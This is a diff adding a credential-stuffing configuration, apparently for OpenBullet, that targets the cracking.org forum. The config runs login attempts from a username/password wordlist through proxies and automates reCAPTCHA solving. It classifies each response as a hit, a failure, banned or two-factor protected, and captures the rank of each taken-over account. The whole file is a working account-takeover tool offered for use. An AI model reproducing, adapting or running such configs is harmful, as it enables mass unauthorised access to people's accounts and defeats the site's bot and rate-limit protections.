@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Cracking.ORG",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-06T09:17:56.3901746+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GETTING_COOKIE REQUEST GET "https://cracking.org/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://cracking.org/" "6LceWRwTAAAAAIXA2oukvEigzhY-4hJFlcjZJ4qh" -> VAR "RECAP" 
+#LOGIN REQUEST POST "https://cracking.org/login/login" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&register=0&password=<PASS>&g-recaptcha-response=<RECAP>&cookie_check=1&redirect=%2F&_xfToken=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "could not be found." 
+    KEY "Incorrect password" 
+    KEY "Two-Step Verification Required" 
+    KEY "You have been banned for the following reason" 
+  KEYCHAIN Success OR 
+    KEY ">Log Out<" 
+#PROFILEURL PARSE "<SOURCE>" LR "<li><a href=\"" "\">Your Profile Page" Recursive=FALSE -> VAR "PROFILE" "" "" 
+#PROFILE REQUEST GET "https://cracking.org/<PROFILE>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Rank PARSE "<SOURCE>" LR "<em class=\"userBanner " "\" itemprop=\"title\">" Recursive=FALSE -> CAP "Rank" "" "" 
